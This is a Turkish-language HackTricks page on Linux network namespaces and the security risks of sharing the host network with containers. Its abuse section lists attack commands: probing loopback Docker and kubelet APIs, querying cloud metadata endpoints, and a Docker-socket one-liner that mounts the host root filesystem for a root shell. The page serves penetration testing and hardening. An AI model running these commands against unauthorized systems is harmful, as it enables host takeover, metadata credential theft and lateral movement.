# Ağ isim alanı

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Ağ isim alanı, arayüzler, IP adresleri, yönlendirme tabloları, ARP/komşu durumu, güvenlik duvarı kuralları, soketler ve `/proc/net` gibi dosyaların içeriği gibi ağla ilgili kaynakları izole eder. Bu nedenle bir container, ana makinenin gerçek ağ yığınına sahip olmadan kendi `eth0`'ına, kendi yerel rotalarına ve kendi loopback aygıtına sahipmiş gibi görünebilir.

Güvenlik açısından bunun önemi, ağ izolasyonunun yalnızca port bağlamadan çok daha fazlası olmasıdır. Özel bir ağ isim alanı, çalışma yükünün doğrudan gözlemleyebileceği veya yeniden yapılandırabileceği şeyleri sınırlar. Bu isim alanı host ile paylaşıldığında, container aniden uygulamaya açılması hiç amaçlanmamış host dinleyicilerini, host-yerel servisleri ve ağ kontrol noktalarını görür hale gelebilir.

## İşleyiş

Yeni oluşturulmuş bir ağ isim alanı, arayüzler eklenene kadar boş veya neredeyse boş bir ağ ortamıyla başlar. Ardından container runtime'ları sanal arayüzler oluşturur veya bağlar, adresler atar ve çalışma yükünün beklenen bağlantıya sahip olması için rotaları yapılandırır. Köprü (bridge)-tabanlı dağıtımlarda bu genellikle container'ın host köprüsüne bağlı veth destekli bir arayüz görmesi anlamına gelir. Kubernetes'te Pod ağı için eşdeğer kurulum CNI eklentileri tarafından yapılır.

Bu mimari, `--network=host` veya `hostNetwork: true`'nin neden bu kadar dramatik bir değişiklik olduğunu açıklar. Hazırlanmış bir özel ağ yığını almak yerine, çalışma yükü host'un gerçek ağ yığınına katılır.

## Lab

Neredeyse boş bir ağ isim alanını şu şekilde görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ve normal ve host-networked containers'ı şu şekilde karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host ağına bağlı konteyner artık kendi izole soket ve arayüz görünümüne sahip değildir. Bu değişiklik, sürecin hangi yetkilere sahip olduğunu sormaya bile başlamadan önce tek başına zaten önemlidir.

## Runtime Usage

Docker ve Podman normalde aksi yapılandırılmadıkça her konteyner için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a, içindeki konteynerler tarafından paylaşılan fakat host'tan ayrı olan kendi network namespace'ini verir. Incus/LXC sistemleri de genellikle daha çeşitli sanal ağ kurulumlarıyla birlikte network-namespace tabanlı zengin izolasyon sağlar.

Ortak ilke, özel ağlamanın varsayılan izolasyon sınırı olmasıdır; host networking ise bu sınırdan açıkça çıkıştır.

## Misconfigurations

En önemli yanlış yapılandırma basitçe host network namespace'inin paylaşılmasıdır. Bu bazen performans, düşük seviyeli izleme veya kullanım kolaylığı için yapılır, ancak konteynerler için mevcut en temiz sınırlarından birini ortadan kaldırır. Host-yerel dinleyiciler daha doğrudan erişilebilir hale gelir, localhost-only servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi yetkiler, etkinleştirdikleri işlemler artık host'un kendi ağ ortamına uygulandığı için çok daha tehlikeli olur.

Bir diğer sorun ise network namespace özel olsa bile ağla ilgili yetkilerin fazla verilmesidir. Özel bir namespace yardımcı olur, ancak raw sockets veya gelişmiş ağ kontrolünü zararsız kılmaz.

Kubernetes'te `hostNetwork: true` ayrıca Pod düzeyindeki ağ segmentasyonuna ne kadar güvenebileceğinizi değiştirir. Kubernetes dokümantasyonu birçok network eklentisinin `hostNetwork` Pod trafiğini `podSelector` / `namespaceSelector` eşleştirmesi için düzgün bir şekilde ayıramadığını ve bu yüzden bunu sıradan node trafiği olarak ele aldığını belirtir. Bir saldırgan açısından bu, ele geçirilmiş bir `hostNetwork` iş yükünün genellikle overlay-network iş yükleriyle aynı politika varsayımlarıyla hâlâ kısıtlanmış normal bir Pod olarak değil, node düzeyinde bir ağ kavşağı (foothold) olarak ele alınması gerektiği anlamına gelir.

## Abuse

Zayıf izole edilmiş kurulumlarda, saldırganlar host'taki dinleyen servisleri inceleyebilir, yalnızca loopback'e bağlı yönetim uç noktalarına erişebilir, trafiği sniffleyebilir veya müdahale edebilir (tam yetkiler ve ortam koşullarına bağlı olarak), veya `CAP_NET_ADMIN` varsa yönlendirme ve firewall durumunu yeniden yapılandırabilir. Bir cluster içinde bu, yatay hareketi ve kontrol düzlemi keşfini de kolaylaştırabilir.

Host networking'den şüpheleniyorsanız, görünür arayüzlerin ve dinleyicilerin izole bir konteyner ağına değil host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services genellikle ilk ilginç keşiftir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Eğer network capabilities mevcutsa, workload'un görünür stack'i inceleyip değiştirebildiğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Modern çekirdeklerde, host networking ile `CAP_NET_ADMIN` paket yolunu basit `iptables` / `nftables` değişikliklerinin ötesinde açığa çıkarabilir. `tc` qdiscs ve filtreler de namespace kapsamında olduğundan, paylaşılan bir host network namespace'inde konteynerin görebildiği host arayüzlerine uygulanırlar. Ek olarak `CAP_BPF` mevcutsa, TC ve XDP loaders gibi ağla ilgili eBPF programları da önemli hale gelir:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Bunun önemi, bir saldırganın sadece firewall rules'ları yeniden yazmakla kalmayıp host interface düzeyinde trafiği mirror, redirect, shape veya drop edebilme ihtimalidir. Bir private network namespace içinde bu eylemler container view ile sınırlıdır; shared host namespace'de ise host-impacting hale gelir.

Cluster veya cloud ortamlarında, host networking ayrıca metadata ve control-plane-adjacent services üzerinde hızlı yerel recon yapılmasını da haklı çıkarır:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Tam Örnek: Host Networking + Local Runtime / Kubelet Access

Host networking otomatik olarak host root sağlamaz, ancak genellikle bilerek yalnızca node'un kendisinden erişilebilir olması amaçlanan servisleri açığa çıkarır. Bu servislerden biri zayıf korunuyorsa, host networking doğrudan bir privilege-escalation yolu olur.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet localhost üzerinde:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Etkiler:

- uygun koruma olmadan bir yerel runtime API'si açığa çıkarsa doğrudan ana makinenin ele geçirilmesi
- cluster reconnaissance veya lateral movement, kubelet veya yerel agentlara erişilebiliyorsa
- traffic manipulation veya denial of service, `CAP_NET_ADMIN` ile birlikte olduğunda

## Kontroller

Bu kontrollerin amacı, işlemin özel bir ağ yığınına sahip olup olmadığını, hangi rotaların ve dinleyicilerin göründüğünü ve ağ görünümünün yetkileri test etmeden önce zaten ana makineye benzer görünüp görünmediğini öğrenmektir.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Eğer `/proc/self/ns/net` ve `/proc/1/ns/net` zaten host-benzeri görünüyorsa, konteyner muhtemelen host network namespace'ini veya başka bir özel olmayan isim alanını paylaşıyor olabilir.
- `lsns -t net` ve `ip netns identify`, shell zaten isimlendirilmiş veya kalıcı bir isim alanının içindeyken ve bunu host tarafındaki `/run/netns` objeleriyle ilişkilendirmek istediğinizde faydalıdır.
- `ss -lntup` özellikle değerlidir çünkü yalnızca loopback dinleyicilerini ve yerel yönetim uç noktalarını ortaya çıkarır.
- Rotalar, interface isimleri, firewall bağlamı, `tc` durumu ve eBPF ekleri, `CAP_NET_ADMIN`, `CAP_NET_RAW` veya `CAP_BPF` mevcutsa çok daha önem kazanır.
- Kubernetes'te, bir `hostNetwork` Pod'undan gelen başarısız servis-isim çözümlemesi, servisin yok olduğu anlamına gelmeyebilir; bunun yerine Pod'un `dnsPolicy: ClusterFirstWithHostNet` kullanmıyor olması anlamına gelebilir.

Bir container'ı incelerken, her zaman network namespace'ini yetki seti ile birlikte değerlendirin. Host networking ile güçlü ağ yetkilerinin birleşimi, bridge networking ile dar bir varsayılan yetki setinin birleşiminden çok farklı bir duruş sergiler.

## Referanslar

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
